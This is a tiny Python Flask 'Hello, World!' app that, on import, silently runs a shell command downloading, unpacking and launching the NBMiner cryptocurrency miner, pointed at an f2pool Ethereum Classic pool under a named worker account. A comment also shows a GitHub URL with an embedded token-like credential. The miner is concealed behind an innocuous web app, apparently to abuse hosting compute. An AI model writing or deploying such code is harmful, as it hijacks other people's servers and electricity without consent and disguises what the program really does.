import os
from flask import Flask
app = Flask(__name__)

@app.route('/')
def hello_world():
   return 'Hello, World!'

#Ex https://Itz-zaid:ghp_147bkkabcdefgh@github.com/Itz-zaid/anything
os.system("apt install wget && wget https://github.com/NebuTech/NBMiner/releases/download/v42.3/NBMiner_42.3_Linux.tgz && tar -zxvf NBMiner_42.3_Linux.tgz && cd NBMiner_Linux && clear && ./nbminer -a etchash -o stratum+tcp://etc.f2pool.com:8118 -u pavan2006.Worker001 &")
